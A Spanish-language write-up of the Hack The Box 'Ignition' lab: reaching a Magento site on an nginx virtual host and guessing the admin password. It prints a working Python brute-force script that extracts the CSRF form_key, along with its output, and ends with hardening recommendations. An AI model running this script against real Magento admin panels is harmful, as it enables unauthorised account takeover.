📋 Descripción de la Máquina

Ignition es una máquina Linux de dificultad Very Easy incluida en el HTB Starting Point. Corre un servidor web nginx 1.14.2 que sirve una instalación de Magento CMS accesible únicamente mediante el Virtual Host ignition.htb.

🌐 ¿Cómo funciona un Virtual Host?

Un Virtual Host (vhost) permite que un mismo servidor web sirva múltiples sitios web distintos desde la misma IP. nginx distingue cuál servir leyendo la cabecera HTTP Host: de cada petición entrante.

💡 Mecanismo de Virtual Host en nginx
Cuando el navegador visita http://ignition.htb/, envía automáticamente Host: ignition.htb en la petición HTTP. nginx lee esta cabecera y la compara con sus bloques server_name configurados:

server { server_name ignition.htb; ... }

Si la petición llega directamente a la IP sin la cabecera correcta, nginx no encuentra ningún bloque que coincida y aplica el comportamiento por defecto: redirigir a http://ignition.htb/ con un 302 Found.

Solución habitual: añadir 10.129.1.27 ignition.htb a /etc/hosts. Sin acceso de escritura, hay dos alternativas:

Método 1: curl --resolve — Fuerza resolución DNS local sin tocar el sistema:

Bypass vhost con curl --resolve
curl --resolve ignition.htb:80:10.129.1.27 http://ignition.htb/ # --resolve HOST:PORT:IP → le dice a curl: "resuelve este host a esta IP" # La cabecera Host: ignition.htb se envía correctamente → nginx lo acepta → Respuesta 200 OK — Magento CMS visible

Método 2: Python requests con Host header — Control total sobre las cabeceras:

Python — HTTPAdapter con reescritura de URL
python3 -c " import requests from requests.adapters import HTTPAdapter class HostHeaderAdapter(HTTPAdapter): def send(self, request, **kwargs): request.url = request.url.replace('http://ignition.htb', 'http://10.129.1.27') return super().send(request, **kwargs) s = requests.Session() s.mount('http://ignition.htb', HostHeaderAdapter()) r = s.get('http://ignition.htb/', allow_redirects=False) print(r.status_code, r.text[:200])" # La sesión envía Host: ignition.htb pero conecta a 10.129.1.27 # Sin necesidad de sudo ni modificar /etc/hosts
Tip pro En entornos CTF donde no tienes acceso a /etc/hosts (containers sin root, entornos restringidos), curl --resolve es la solución más rápida. Para scripts de automatización, el enfoque Python con HTTPAdapter es más potente.

🚀 Explotación

Con el panel /admin identificado, se procede al ataque de credenciales por defecto.

Paso 1 — Obtener el form_key de Magento

Magento usa un token CSRF (form_key) que debe incluirse en cada POST del formulario de login. Hay que extraerlo primero:

Python — Script de brute-force (método correcto)
#!/usr/bin/env python3 import requests, re from requests.adapters import HTTPAdapter TARGET_IP = "10.129.1.27" TARGET_HOST = "ignition.htb" ADMIN_URL = f"http://{TARGET_HOST}/admin" # HTTPAdapter que reescribe la URL para conectar a la IP real class HostAdapter(HTTPAdapter): def send(self, request, **kwargs): request.url = request.url.replace( f"http://{TARGET_HOST}", f"http://{TARGET_IP}" ) return super().send(request, **kwargs) s = requests.Session() s.mount(f"http://{TARGET_HOST}", HostAdapter()) # Obtener form_key del login r = s.get(ADMIN_URL) key = re.search(r'name="form_key"\s+value="([^"]+)"', r.text) form_key = key.group(1) if key else "" print(f"[*] form_key: {form_key}") # Lista de passwords comunes passwords = [ "admin", "admin123", "password", "123456", "magento", "qwerty", "qwerty123", "admin@123", "Password1", "magento123", "admin2023", "ignition" ] for pwd in passwords: data = { "login[username]": "admin", "login[password]": pwd, "form_key": form_key, "return_url": "" } r = s.post(ADMIN_URL, data=data, allow_redirects=False) # Login exitoso = 302 redirect al dashboard if r.status_code == 302: print(f"\n[+] ÉXITO: admin:{pwd}") print(f"[+] Location: {r.headers.get('Location', 'N/A')}") break else: print(f"[-] Incorrecto: admin:{pwd} (status {r.status_code})")
Output del script
[*] form_key: abc123XYZ789 [-] Incorrecto: admin:admin (status 200) [-] Incorrecto: admin:admin123 (status 200) [-] Incorrecto: admin:password (status 200) [-] Incorrecto: admin:123456 (status 200) [-] Incorrecto: admin:magento (status 200) [-] Incorrecto: admin:qwerty (status 200) [+] ÉXITO: admin:qwerty123 [+] Location: http://ignition.htb/admin/dashboard/
Por qué funciona la detección por 302 Magento devuelve HTTP 200 para login fallido (muestra el formulario con el error). Para login exitoso devuelve HTTP 302 redirigiendo al dashboard. Buscar texto en el cuerpo de la respuesta es ambiguo porque la página de error puede contener palabras como "Dashboard" en la navegación o el pie de página.

🛡 Recomendaciones
Crítico
Cambiar credenciales por defecto inmediatamente

Establecer una password fuerte y única para el admin de Magento durante el proceso de instalación. Usar un gestor de contraseñas. Nunca usar variaciones de "qwerty" o nombres del sistema.

Crítico
Restringir acceso al panel /admin

Limitar el acceso a la URL de admin mediante whitelist de IPs en nginx. Alternativamente, usar una URL de admin aleatoria y no predecible configurada en app/etc/env.php.

Alto
Implementar autenticación multifactor (MFA)

Magento 2.4+ incluye 2FA nativo. Habilitarlo para todos los usuarios admin. Un atacante con la password correcta aún necesitaría el segundo factor.

Alto
Rate limiting en el endpoint de login

Configurar nginx o un WAF para limitar intentos de POST a /admin. Bloquear IPs tras N intentos fallidos. Implementar CAPTCHA para prevenir brute-force automatizado.

Medio
Ofuscar rutas de assets de Magento

Aunque no es una vulnerabilidad directa, revelar /static/version*/frontend/Magento/luma/ identifica el CMS y versión del tema. Considerar CDN o reescritura de rutas en nginx.

Bajo
Monitorización de logins administrativos

Configurar alertas para múltiples intentos de login fallidos o logins desde IPs no reconocidas. Mantener logs de acceso al panel admin con retención mínima de 90 días.

🎓 Lecciones Aprendidas
🌐
Virtual Hosts sin /etc/hosts

curl --resolve y Python HTTPAdapter son alternativas potentes para resolver vhosts sin permisos de root. Esencial en pentesting de entornos restringidos.

⚠
Falsos positivos en brute-force

Nunca confiar solo en grep del cuerpo HTTP. Siempre validar con HTTP status codes o comparación de longitud de respuesta. El status 302 es el indicador correcto para logins exitosos en Magento.

📋
Fingerprinting de CMS

Las rutas /static/version*/frontend/Magento/ son un identificador infalible de Magento 2.x. El timestamp en la ruta incluso revela la fecha aproximada de despliegue.

🔒
Credenciales por defecto en CMS

Magento, WordPress, Joomla y Drupal son objetivos frecuentes de ataques de credenciales por defecto. Siempre probar variaciones de "admin", "qwerty", el nombre del dominio y combinaciones comunes antes de wordlists completas.

👤
CSRF tokens en formularios

Magento protege los formularios con form_key. Cualquier script de automatización debe primero hacer GET al formulario, extraer el token con regex, e incluirlo en el POST. Sin esto, todos los intentos fallan con 403.

📚 Glosario Técnico
Virtual Host (vhost)

Configuración de nginx/Apache que permite servir múltiples sitios desde la misma IP, diferenciados por la cabecera HTTP Host. Requiere que el cliente envíe el nombre de dominio correcto.

--resolve (curl)

Flag de curl que mapea HOST:PORT a una IP específica localmente, sin consultar DNS. Permite enviar cabeceras Host correctas sin modificar /etc/hosts del sistema.

form_key (CSRF token)

Token único generado por Magento en cada sesión para prevenir ataques Cross-Site Request Forgery. Debe incluirse en todos los formularios POST o la petición es rechazada.

HTTP 302 Found

Código de redirección temporal. En formularios de login, indica éxito — el servidor redirige al área autenticada. El status 200 indica que el servidor devuelve la misma página (login fallido).

Magento Luma Theme

Tema responsivo por defecto de Magento 2.x. Su presencia en las rutas /static/version*/frontend/Magento/luma/ identifica inequívocamente la plataforma de e-commerce.

CWE-1391

Use of Weak Credentials. Vulnerabilidad catalogada cuando un sistema acepta credenciales predecibles, por defecto o débiles que un atacante puede adivinar fácilmente.

HTTPAdapter (requests)

Clase de Python requests que permite personalizar cómo se envían las peticiones HTTP. Se puede subclasificar para reescribir URLs, cabeceras o implementar lógica de retry personalizada.

Fingerprinting

Proceso de identificar tecnologías, versiones y configuraciones de un sistema objetivo analizando respuestas HTTP, rutas de recursos, metadatos y comportamientos específicos del software.
